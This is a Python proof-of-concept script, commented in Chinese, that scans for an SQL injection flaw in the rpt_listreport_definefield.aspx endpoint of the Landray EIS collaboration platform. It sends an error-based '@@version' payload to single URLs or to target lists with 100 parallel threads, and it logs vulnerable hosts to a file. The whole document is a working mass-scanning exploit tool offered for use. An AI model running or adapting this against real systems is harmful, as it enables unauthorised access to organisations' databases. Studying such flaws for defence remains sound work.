import requests,argparse,re,os,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    banner = '''
██╗     ██╗     ███████╗██╗███████╗ █████╗ ██╗  ██╗██████╗ ██╗  ██╗
██║     ██║     ██╔════╝██║██╔════╝██╔══██╗╚██╗██╔╝██╔══██╗╚██╗██╔╝
██║     ██║     █████╗  ██║███████╗███████║ ╚███╔╝ ██████╔╝ ╚███╔╝ 
██║     ██║     ██╔══╝  ██║╚════██║██╔══██║ ██╔██╗ ██╔═══╝  ██╔██╗ 
███████╗███████╗███████╗██║███████║██║  ██║██╔╝ ██╗██║     ██╔╝ ██╗
                                                                                                                                                                   
                                         version:蓝凌EIS智慧协同平台
'''
    print(banner)

def main():
    banner()

    parser = argparse.ArgumentParser(description='蓝凌EIS智慧协同平台rpt_listreport_definefield.aspx接口存在SQL注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()
    # print(args.url,args.file)
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag: \n\t python:{sys.argv[0]} -h")

def poc(target):
    payload = '/SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+'
    url = target+payload
    header = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Connection": "keep-alive",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Upgrade-Insecure-Requests": "1",
    }
    try:
        res = requests.get(url=url,headers=header,verify=False,timeout=10)
        if res.status_code == 500 and 'Microsoft SQL Server' in res.text:
            print(f"[+]此url{target}存在漏洞")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
        else:
            print(f"[-]此url{target}不存在漏洞")
    except Exception as e:
        print(f"[*]此url{target}可能存在访问问题，请手工测试")

if __name__ == '__main__':
    main()
